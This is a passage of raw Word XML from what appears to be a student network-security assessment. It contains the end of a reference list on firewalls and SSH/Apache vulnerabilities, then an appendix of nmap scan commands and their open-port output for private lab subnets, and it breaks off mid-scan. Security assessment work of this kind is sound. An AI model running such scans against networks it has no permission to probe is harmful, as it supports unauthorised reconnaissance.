                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t>Learn about the PFSENSE project</w:t>
              </w:r>
              <w:r w:rsidRPr="00DB3716">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve">. Available at: </w:t>
              </w:r>
              <w:hyperlink r:id="rId57" w:history="1">
                <w:r w:rsidRPr="00DB3716">
                  <w:rPr>
                    <w:rStyle w:val="Hyperlink"/>
                    <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                    <w:lang w:eastAsia="en-US"/>
                  </w:rPr>
                  <w:t>https://www.pfsense.org/about-pfsense/</w:t>
                </w:r>
              </w:hyperlink>
              <w:r w:rsidRPr="00DB3716">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve"> (Accessed: </w:t>
              </w:r>
              <w:r w:rsidR="004C03C3">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t>11</w:t>
              </w:r>
              <w:r w:rsidRPr="00DB3716">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve"> </w:t>
              </w:r>
              <w:r w:rsidR="004C03C3">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t>October</w:t>
              </w:r>
              <w:r w:rsidRPr="00DB3716">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve"> 2024). </w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="5111B4E4" w14:textId="1C5549C6" w:rsidR="00ED3057" w:rsidRPr="00ED3057" w:rsidRDefault="00ED3057" w:rsidP="00ED3057">
              <w:pPr>
                <w:ind w:left="19" w:right="6" w:hanging="709"/>
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
              </w:pPr>
              <w:r w:rsidRPr="00ED3057">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t>Open source router and firewall platform</w:t>
              </w:r>
              <w:r w:rsidRPr="00ED3057">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve"> (</w:t>
              </w:r>
              <w:r w:rsidR="00E916C6">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t>2024</w:t>
              </w:r>
              <w:r w:rsidRPr="00ED3057">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve">) </w:t>
              </w:r>
              <w:r w:rsidRPr="00ED3057">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t>VyOS</w:t>
              </w:r>
              <w:r w:rsidRPr="00ED3057">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve">. Available at: </w:t>
              </w:r>
              <w:hyperlink r:id="rId58" w:history="1">
                <w:r w:rsidRPr="00ED3057">
                  <w:rPr>
                    <w:rStyle w:val="Hyperlink"/>
                    <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                    <w:lang w:eastAsia="en-US"/>
                  </w:rPr>
                  <w:t>https://vyos.io/</w:t>
                </w:r>
              </w:hyperlink>
              <w:r w:rsidRPr="00ED3057">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve"> (Accessed: </w:t>
              </w:r>
              <w:r w:rsidR="007F6F59">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve">22 </w:t>
              </w:r>
              <w:r w:rsidRPr="00ED3057">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve"> </w:t>
              </w:r>
              <w:r w:rsidR="007F6F59">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t>October</w:t>
              </w:r>
              <w:r w:rsidRPr="00ED3057">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve"> 2024). </w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="0BBD459A" w14:textId="3A7C9689" w:rsidR="003C4E66" w:rsidRPr="003C4E66" w:rsidRDefault="003C4E66" w:rsidP="003C4E66">
              <w:pPr>
                <w:ind w:left="19" w:right="6" w:hanging="709"/>
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
              </w:pPr>
              <w:r w:rsidRPr="003C4E66">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t>Essentials¶</w:t>
              </w:r>
              <w:r w:rsidRPr="003C4E66">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve">, </w:t>
              </w:r>
              <w:r w:rsidRPr="003C4E66">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t>Apache HTTP Server 2.2 vulnerabilities - The Apache HTTP Server Project</w:t>
              </w:r>
              <w:r w:rsidRPr="003C4E66">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve">. Available at: </w:t>
              </w:r>
              <w:hyperlink r:id="rId59" w:history="1">
                <w:r w:rsidRPr="003C4E66">
                  <w:rPr>
                    <w:rStyle w:val="Hyperlink"/>
                    <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                    <w:lang w:eastAsia="en-US"/>
                  </w:rPr>
                  <w:t>https://httpd.apache.org/security/vulnerabilities_22.html</w:t>
                </w:r>
              </w:hyperlink>
              <w:r w:rsidRPr="003C4E66">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve"> (Accessed: 01 </w:t>
              </w:r>
              <w:r w:rsidR="007F6F59">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t>November</w:t>
              </w:r>
              <w:r w:rsidRPr="003C4E66">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve"> 2024). </w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="5DD40096" w14:textId="6727BE9B" w:rsidR="001825D4" w:rsidRPr="001825D4" w:rsidRDefault="001825D4" w:rsidP="001825D4">
              <w:pPr>
                <w:ind w:left="19" w:right="6" w:hanging="709"/>
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
              </w:pPr>
              <w:r w:rsidRPr="001825D4">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t>Critical vulnerability in openssh</w:t>
              </w:r>
              <w:r w:rsidRPr="001825D4">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve"> (</w:t>
              </w:r>
              <w:r w:rsidR="00E916C6">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t>2024</w:t>
              </w:r>
              <w:r w:rsidRPr="001825D4">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve">) </w:t>
              </w:r>
              <w:r w:rsidRPr="001825D4">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t>CERT</w:t>
              </w:r>
              <w:r w:rsidRPr="001825D4">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve">. Available at: </w:t>
              </w:r>
              <w:hyperlink r:id="rId60" w:history="1">
                <w:r w:rsidRPr="001825D4">
                  <w:rPr>
                    <w:rStyle w:val="Hyperlink"/>
                    <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                    <w:lang w:eastAsia="en-US"/>
                  </w:rPr>
                  <w:t>https://cert.europa.eu/publications/security-advisories/2024-066/</w:t>
                </w:r>
              </w:hyperlink>
              <w:r w:rsidRPr="001825D4">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve"> (Accessed: 0</w:t>
              </w:r>
              <w:r w:rsidR="007F6F59">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t>3</w:t>
              </w:r>
              <w:r w:rsidRPr="001825D4">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve"> </w:t>
              </w:r>
              <w:r w:rsidR="007F6F59">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t>November</w:t>
              </w:r>
              <w:r w:rsidRPr="001825D4">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve"> 2024). </w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="1A52EB3E" w14:textId="297D843C" w:rsidR="00D9247C" w:rsidRPr="00D9247C" w:rsidRDefault="00D9247C" w:rsidP="00D9247C">
              <w:pPr>
                <w:ind w:left="19" w:right="6" w:hanging="709"/>
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
              </w:pPr>
              <w:r w:rsidRPr="00D9247C">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t>New critical SSH vulnerability released</w:t>
              </w:r>
              <w:r w:rsidRPr="00D9247C">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve">. Available at: </w:t>
              </w:r>
              <w:hyperlink r:id="rId61" w:history="1">
                <w:r w:rsidRPr="00D9247C">
                  <w:rPr>
                    <w:rStyle w:val="Hyperlink"/>
                    <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                    <w:lang w:eastAsia="en-US"/>
                  </w:rPr>
                  <w:t>https://cognisys.co.uk/blog/new-critical-ssh-vulnerability-released-cve-2024-6387/</w:t>
                </w:r>
              </w:hyperlink>
              <w:r w:rsidRPr="00D9247C">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve"> (Accessed: 0</w:t>
              </w:r>
              <w:r w:rsidR="007F6F59">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t>3 November</w:t>
              </w:r>
              <w:r w:rsidRPr="00D9247C">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve"> 2024). </w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="5AB84446" w14:textId="1BE6367E" w:rsidR="00E916C6" w:rsidRPr="00E916C6" w:rsidRDefault="00E916C6" w:rsidP="00E916C6">
              <w:pPr>
                <w:ind w:right="6" w:hanging="709"/>
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
              </w:pPr>
              <w:r w:rsidRPr="00E916C6">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t>Computers I 4.5 network physical structures</w:t>
              </w:r>
              <w:r w:rsidRPr="00E916C6">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve">. Available at: </w:t>
              </w:r>
              <w:hyperlink r:id="rId62" w:history="1">
                <w:r w:rsidRPr="00E916C6">
                  <w:rPr>
                    <w:rStyle w:val="Hyperlink"/>
                    <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                    <w:lang w:eastAsia="en-US"/>
                  </w:rPr>
                  <w:t>https://courses.aiu.edu/COMPUTERS/7/Lesson7.pdf</w:t>
                </w:r>
              </w:hyperlink>
              <w:r w:rsidRPr="00E916C6">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve"> (Accessed: 01 December 2024). </w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="2B793158" w14:textId="77777777" w:rsidR="006419C4" w:rsidRDefault="006419C4" w:rsidP="00261013">
              <w:pPr>
                <w:ind w:right="6" w:hanging="709"/>
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
              </w:pPr>
            </w:p>
            <w:p w14:paraId="58F93D36" w14:textId="459B9142" w:rsidR="00801886" w:rsidRPr="006E34CB" w:rsidRDefault="00CF208F" w:rsidP="005B0E0A">
              <w:pPr>
                <w:ind w:right="4"/>
                <w:jc w:val="both"/>
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
              </w:pPr>
            </w:p>
          </w:sdtContent>
        </w:sdt>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="6CAE3906" w14:textId="77777777" w:rsidR="006C6590" w:rsidRDefault="006C6590" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E5AEB50" w14:textId="3FAD68C0" w:rsidR="00801886" w:rsidRPr="009A241B" w:rsidRDefault="00341658" w:rsidP="008605B2">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="431" w:right="4"/>
      </w:pPr>
      <w:bookmarkStart w:id="29" w:name="_Toc183984571"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Appendices</w:t>
      </w:r>
      <w:bookmarkEnd w:id="29"/>
      <w:r w:rsidR="0005479F">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23244F05" w14:textId="44C2BD3E" w:rsidR="00877665" w:rsidRDefault="00341658" w:rsidP="00877665">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="578" w:right="4" w:hanging="578"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="30" w:name="_Toc183984572"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Appendix </w:t>
      </w:r>
      <w:r w:rsidR="009525A9">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidR="00F15C6D">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00CC6B6C">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>– Nmap Scans</w:t>
      </w:r>
      <w:bookmarkEnd w:id="30"/>
      <w:r w:rsidR="00F15C6D">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39211C7F" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>root@kali:~# nmap 192.168.0.224/30</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="464F001D" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-01 16:41 EST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FC4396A" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap scan report for 192.168.0.225</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05DB9265" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host is up (0.00062s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="538BDBF8" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Not shown: 996 closed ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3782AA89" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>PORT    STATE SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AD523C3" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>22/tcp  open  ssh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DC9A916" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>23/tcp  open  telnet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C688224" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>80/tcp  open  http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60556E0D" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>443/tcp open  https</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="486BD3CC" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BA9023D" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap scan report for 192.168.0.226</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DC7C2CA" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host is up (0.0013s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03889721" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Not shown: 997 closed ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A1A7500" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>PORT    STATE SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54075AB0" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>23/tcp  open  telnet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="392EFC09" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>80/tcp  open  http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A87C6E6" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>443/tcp open  https</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25E65965" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11004A7E" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap done: 4 IP addresses (2 hosts up) scanned in 14.38 seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53366C3C" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>root@kali:~# nmap 192.168.0.228/30</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E316EE" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
